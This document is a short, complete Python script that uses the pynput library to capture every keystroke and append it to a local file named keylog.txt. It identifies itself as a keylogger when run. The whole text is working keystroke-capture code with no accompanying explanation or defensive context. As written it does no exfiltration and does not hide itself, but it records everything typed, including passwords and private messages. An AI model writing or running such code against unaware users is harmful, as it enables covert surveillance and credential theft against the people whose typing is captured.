from pynput import keyboard

# File to save keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    """Callback function to record key presses."""
    try:
        with open(LOG_FILE, "a") as log_file:
            # Write the key character if it's alphanumeric or a space
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            else:
                # Write special keys (like Enter, Space, etc.)
                log_file.write(f' [{key}] ')
    except Exception as e:
        print(f"Error logging key: {e}")

def main():
    print("Keylogger is running... Press 'Ctrl + C' to stop.")
    print(f"Logged keystrokes will be saved to: {LOG_FILE}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
